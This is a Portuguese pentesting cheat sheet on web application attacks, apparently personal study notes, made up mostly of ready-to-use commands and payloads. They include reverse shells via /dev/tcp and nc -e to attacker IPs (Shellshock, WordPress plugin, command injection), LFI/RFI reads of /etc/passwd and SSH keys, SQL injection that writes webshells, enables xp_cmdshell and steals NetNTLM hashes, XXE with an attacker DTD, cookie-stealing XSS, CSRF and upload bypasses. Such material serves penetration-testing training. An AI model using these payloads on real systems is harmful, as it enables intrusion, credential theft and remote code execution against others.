# 4. Ataques a Aplicações Web

### 4.1 Metodologia
1. **Fingerprint** → 2. **Fuzzing** → 3. **Análise de HTML/JS** → 4. **Checklist**: qual webserver/backend? métodos permitidos? links/dicas no source? admin panel? credenciais default? mudar o hostname altera algo?

### 4.2 Fingerprinting

```bash
nikto -h http://$IP -p $PORT
whatweb http://$IP
wafw00f http://$IP                      # identificar WAF
# banner grabbing:
nc $IP 80
GET / HTTP/1.1
Host: $IP
```

### 4.3 Fuzzing (diretórios/arquivos)

```bash
gobuster dir -f -r -k -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.html
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
dirb http://$IP /usr/share/dirb/wordlists/common.txt
```
Wordlists: `/usr/share/seclists/` · `/usr/share/dirb/wordlists/` · `/usr/share/wfuzz/wordlist/`

### 4.4 Análise de HTML/JS

```bash
linkfinder ...                          # links em arquivos .js
cewl http://$IP/index.html -m 2 -w cewl.lst   # gerar wordlist do site
html2text                               # HTML → texto legível
httrack http://site.com                 # baixar o site inteiro
```

### 4.5 Vulnerabilidades web comuns

**Shellshock** (Apache mod_cgi, webmin): achar `/cgi-bin/<script>`, então:
```bash
curl -H 'User-Agent: () {:;}; echo; echo; /bin/bash -i >& /dev/tcp/10.10.15.1/1337 0>&1' http://$IP/cgi-bin/user.sh
```

**WebDAV**:
```bash
davtest --url http://$IP        # mostra o que é executável
cadaver http://$IP              # ls para listar diretórios
```

---

### 4.6 Local / Remote File Inclusion (LFI/RFI)

**LFI básico**:
```text
# Linux:   https://site/loadImage?filename=../../../etc/passwd
# Windows: http://target/?page=c:\windows\system32\drivers\etc\hosts
```

**Bypass de obstáculos**:
```text
/etc/passwd                              # só o path
....//....//....//etc/passwd             # stripping não-recursivo
..%252f..%252f..%252fetc/passwd          # double encoding
/var/www/images/../../../etc/passwd      # validação de start path
..%252f..%252f..%252fetc/passwd%00       # nullbyte
```

**PHP wrappers (LFI → leitura/RCE)**:
```text
php://filter/convert.base64-encode/resource=secret.inc
expect://whoami
data://text/plain;base64,<b64>           # data://text/plain,<?php system('id');?>
php://input      (corpo POST: <?php system($_GET['cmd']);?>)
zip://path/to/hello.zip%23rce.php
```

**Log Poisoning (LFI → RCE)**: injetar `<?php system($_GET['cmd']); ?>` num log e incluí-lo.
```bash
# Poison via User-Agent / SMTP / SSH, depois incluir:
curl 'http://$IP/menu.php?file=/var/log/apache2/access.log&cmd=id'
# /proc/self/environ (injetar via User-Agent):
curl 'http://$IP/index.php?view=../../../proc/self/environ'
```

Locais de log comuns: `/var/log/apache2/{access,error}.log` (Debian) · `/var/log/httpd/{access,error}_log` (RHEL) · `/var/log/{vsftpd,sshd,mail}.log`.
Configs comuns: `/etc/apache2/apache2.conf`, `/etc/apache2/sites-enabled/000-default.conf`, chaves SSH em `/root/.ssh/id_rsa`, `.bash_history`.

**RFI** (requer `allow_url_include=On`):
```text
http://$IP/page.php?LANG=http://10.10.10.10/evil.php%00
http://$IP/blog/?lang=//10.10.14.23/Public/shell.php&0=dir    # shell: <?=$_GET[0]?>
```
> Lista completa de LFI files no Windows → ver [[06 - Escalação de Privilégios em Windows#6.8 LFI files (Windows)]].

---

### 4.7 CMS

**WordPress**:
```bash
wpscan --url http://$IP --enumerate ap,at,cb,dbe -o out.txt
# Reverse shell via admin: criar plugin .php malicioso, zipar, upload como plugin, ativar:
# <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"); ?>
```
**Joomla**: `http://site/administrator/manifests/files/joomla.xml` (versão) · `joomscan -ec -u http://$IP`
**Drupal**: `droopescan scan drupal -u $IP:80` · Drupalgeddon2.

---

### 4.8 Command Injection

```text
https://vuln.io/test.php?id=1 && nc -e /bin/sh 10.10.10.16 4444
```
JS: `eval()`, `setTimeout()`, `setInterval()`, `Function()` → injeção; `process.kill(process.pid)`.

---

### 4.9 SQL Injection

**Classes**: inbound · out-of-band · inferential. **Tipos**: error-based · union-based · blind (time/boolean).
**Metodologia**: identificar injeção e tipo (`'` em strings) → error-based → union-based → blind.

#### Error-based (MSSQL)
```sql
?id=1 or 1=convert(int,(USER))--          -- extrai user via erro de conversão
?id=1 or 1=convert(int,@@version)--
?id=1' HAVING 1=1--                        -- enumera colunas
?id=1' GROUP BY news.news_id HAVING 1=1--
-- Habilitar xp_cmdshell (MSSQL 2005+):
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

#### Union-based
```sql
?id=738 order by N--                       -- achar nº de colunas (erro quando excede)
?id=-1 union select 1,2,3,4,@@version,6    -- -1 força ver as colunas imprimíveis
?id=-1 union select 1,2,3,4,user(),6
?id=-1 union select 1,2,3,4,table_name,6 FROM information_schema.tables
?id=-1 union select 1,2,3,4,column_name,6 FROM information_schema.columns WHERE table_name='users'
?id=-1 union select 1,2,name,4,password,6 FROM users
-- Escrever webshell:
union select "<?php echo shell_exec($_GET['cmd']);?>",2,3 into OUTFILE '/var/www/html/shell.php'
-- Ler arquivo:
union select 1,2,load_file("/etc/passwd"),4
-- Concatenar múltiplos valores (Oracle): ' UNION SELECT username||'~'||password FROM users--
```

#### Blind
```sql
-- Boolean:
?id=6 and 1=1        -- difere de
?id=6 and 1=2
xyz' UNION SELECT 'a' FROM Users WHERE Username='Administrator' and SUBSTRING(Password,1,1)>'m'--
-- Time (MySQL / MSSQL):
?id=738-sleep(5)
'; IF (SELECT COUNT(username) FROM Users WHERE username='Administrator' AND SUBSTRING(password,1,1)>'m')=1 WAITFOR DELAY '0:0:5'--
-- Error-conditional (MSSQL):
xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
```

#### Login bypass
```sql
' or '1'='1        ' or 1=1;--        ' or 1=1 LIMIT 1;--
admin' --          ') or ('x'='x
```

#### Filter bypass
`AND`→`&&` · `OR`→`||` · comentários `-- ` / `/**/` · second-order (registrar usuário malicioso e logar).

#### Roubar NetNTLM (MSSQL) + responder
```sql
'+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
```

#### sqlmap
```bash
sqlmap -u 'http://$IP/comment.php?id=839' --dbms=mysql --dump --threads=5
sqlmap -u 'http://$IP' --crawl=1
sqlmap ... --os-shell          # RCE automático
```

---

### 4.10 NoSQL Injection

```json
// Bypass de autenticação (URL):
// username[$ne]=x&password[$ne]=x
// username[$regex]=^.{4}&password=x         # descobrir tamanho
// Corpo JSON (node):  Content-Type: application/json
{ "username": {"$ne":"x"}, "password": {"$ne":"x"} }
```

---

### 4.11 SSRF
Forçar o servidor a requisitar URLs internas (`http://127.0.0.1/admin`, `http://192.168.0.68/admin`).
**Bypass de blacklist**: `2130706433`, `017700000001`, `127.1`, domínio que resolve p/ 127.0.0.1.
**Bypass de whitelist**: `https://expected-host@evil-host`, `https://evil-host#expected-host`, double-encode `#` → `%2523`, open redirect. Blind SSRF → detectar via OAST (Burp Collaborator).

### 4.12 CSRF
Requer: ação relevante + sessão só por cookie + sem parâmetros imprevisíveis. Form com auto-submit:
```html
<form action="https://vuln/email/change" method="POST">
  <input type="hidden" name="email" value="pwned@evil.net"/>
</form><script>document.forms[0].submit();</script>
```
Bypass: método GET aceito; token não vinculado à sessão; token duplicado em cookie; validação de Referer fraca.

### 4.13 XXE
```xml
<!-- Ler arquivo -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
<!-- SSRF -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.site/"> ]>
<!-- Blind OOB (hospedar malicious.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### 4.14 XSS
**Tipos**: Reflected · Stored · DOM-based.
```html
<script>alert(document.domain)</script>          <!-- entre tags -->
"><script>alert(1)</script>                        <!-- atributo -->
" autofocus onfocus=alert(1) x="
</script><img src=1 onerror=alert(1)>              <!-- em JS -->
'-alert(1)-'    ';alert(1)//                        <!-- string JS -->
${alert(1)}                                         <!-- template literal -->
<!-- Roubar cookie: -->
<script>new Image().src="http://10.10.30.5:81/c.php?o="+document.cookie;</script>
```

### 4.15 Upload bypass
```bash
# Extensões PHP:  .phtml .php3 .php4 .php5 .php7 .inc | ASP: .asp .aspx | IIS<=6: test.asp;.txt
# Magic bytes PNG (89 50 4E 47 0D 0A 1A 0A) para burlar checagem de MIME:
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png
```
**Verb tampering**: trocar GET→POST para burlar autenticação configurada só em um método.

### 4.16 SSL
```bash
sslyze --regular $IP
sslscan $IP
```
